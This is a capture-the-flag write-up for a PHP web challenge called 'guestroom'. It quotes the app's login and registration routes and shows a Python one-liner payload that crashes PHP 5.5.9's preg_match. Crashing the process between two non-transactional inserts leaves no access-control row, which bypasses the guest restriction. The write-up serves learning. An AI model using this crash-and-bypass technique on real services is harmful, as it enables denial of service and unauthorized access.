# guestroom

This is web challenge. First, let's see /flag routine.

## app.php

```php
$app->get('/flag', function () use ($app) {
    if (isset($_SESSION['is_logined']) === false || isset($_SESSION['is_guest']) === true) {
        $app->redirect('/#try+harder');
    }
    return $app->flag;
});
```

Both session variable is set in /login-2fa.

```php
$app->post('/login-2fa', function () use ($app) {
    if (isset($_SESSION['id']) === false) {
        $app->redirect('/#missing+login');
    }

    $code = (isset($_POST['code']) === true && $_POST['code'] !== '') ? (string)$_POST['code'] : die('Missing code');

    require_once('libs/PHPGangsta/GoogleAuthenticator.php');
    $ga = new PHPGangsta_GoogleAuthenticator();

    $sth = $app->pdo->prepare('SELECT secret FROM users WHERE id = :id');
    $sth->execute([':id' => $_SESSION['id']]);
    $secret = $sth->fetch()[0];
    if ($ga->verifyCode($secret, $code) === false) {
        $app->redirect('/login-2fa#invalid+auth');
    }

    $sth = $app->pdo->prepare('SELECT authorize FROM acl WHERE id = :id');
    $sth->execute([':id' => $_SESSION['id']]);
    if ($sth->fetch()[0] === 'GUEST') {
        $_SESSION['is_guest'] = true;
    }

    $_SESSION['is_logined'] = true;
    $app->redirect('/#logined');
});

```

Condition for is_guest is "`acl.authorize with id=$_SESSION['id']` is not GUEST", which is achievable if the value differs or does not exist (NULL). acl.authorize is inserted at /register. See <--.

```php
$app->post('/register', function () use ($app) {
    $id = (isset($_POST['id']) === true && $_POST['id'] !== '') ? (string)$_POST['id'] : die('Missing id');
    $pw = (isset($_POST['pw']) === true && $_POST['pw'] !== '') ? (string)$_POST['pw'] : die('Missing pw');
    $code = (isset($_POST['code']) === true) ? (string)$_POST['code'] : '';

    if (strlen($id) > 32 || strlen($pw) > 32) {
        die('Invalid input');
    }

    $sth = $app->pdo->prepare('SELECT id FROM users WHERE id = :id');
    $sth->execute([':id' => $id]);
    if ($sth->fetch() !== false) {
        $app->redirect('/#duplicate+id');
    }

    $sth = $app->pdo->prepare('INSERT INTO users (id, pw) VALUES (:id, :pw)');
    $sth->execute([':id' => $id, ':pw' => $pw]);

    preg_match('/\A(ADMIN|USER|GUEST)--((?:###|\w)+)\z/i', $code, $matches); // <--
    if (count($matches) === 3 && $app->code[$matches[1]] === $matches[2]) {
        $sth = $app->pdo->prepare('INSERT INTO acl (id, authorize) VALUES (:id, :authorize)');
        $sth->execute([':id' => $id, ':authorize' => $matches[1]]);
    } else {
        $sth = $app->pdo->prepare('INSERT INTO acl (id, authorize) VALUES (:id, "GUEST")');
        $sth->execute([':id' => $id]);
    }

    $app->redirect('/#registered');
});

```

Since the server's php version is exposed and it is 5.5.9, I doubted that preg_match has some vulnerability. It was right. For testing I wrote a simple script.

```php
<?php
$code = file_get_contents("php://stdin");
preg_match('/\A(ADMIN|USER|GUEST)--((?:###|\w)+)\z/i', $code, $matches);
```

```
$ python -c 'print "GUEST--" + "0a" * 10000'|php check.php
Segmentation fault

```

Hooray! Since without transaction, each query is auto-commit mode, and if php crashes between two queries(INSERT INTO users / acl), I can bypass the condition. It worked. After giving the payload as `$_POST['code']`, I could get the flag after doing 2fa.